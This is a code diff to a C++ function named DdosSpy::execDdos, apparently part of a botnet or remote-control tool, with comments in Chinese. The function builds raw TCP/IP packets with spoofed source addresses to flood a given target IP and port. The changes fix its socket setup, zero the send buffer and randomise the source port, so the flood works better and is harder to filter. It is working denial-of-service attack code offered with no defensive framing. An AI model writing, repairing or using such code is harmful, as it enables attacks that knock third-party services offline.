@@ -195,13 +195,17 @@ void DdosSpy::execDdos(std::string atk_ip, int atk_port)
     int port=atk_port;
     const char *DestIP=atk_ip.data();
 
+
+    //wsastartup没写.........
     /******************/
-    SOCKET  sock =NULL;
-    int flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=rand()%2000;
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2,2),&wsaData);
+    SOCKET  sock =(SOCKET)NULL;
+    int flag=true,TimeOut=2000,FakeIpNet,FakeIpHost,dataSize=0,SendSEQ=0;
     struct sockaddr_in sockAddr;
     TCP_HEADER  tcpheader;
     IP_HEADER   ipheader;
-    char        sendBuf[128];
+    char        sendBuf[128]={0};
     sock=WSASocket(AF_INET,SOCK_RAW,IPPROTO_RAW,NULL,0,WSA_FLAG_OVERLAPPED);
     //设置IP_HDRINCL以便自己填充IP首部
     setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&flag,sizeof(int));
@@ -225,7 +229,7 @@ void DdosSpy::execDdos(std::string atk_ip, int atk_port)
     ipheader.destIP = inet_addr(DestIP);
     //填充TCP首部
     tcpheader.th_dport=htons(port);  //目的端口
-    tcpheader.th_sport = htons(8080);   //源端口
+    tcpheader.th_sport = htons(rand()%1025);   //源端口
     tcpheader.th_seq = htonl(SEQ+SendSEQ);
     tcpheader.th_ack = 0;
     tcpheader.th_lenres =(sizeof(TCP_HEADER)/4<<4|0);
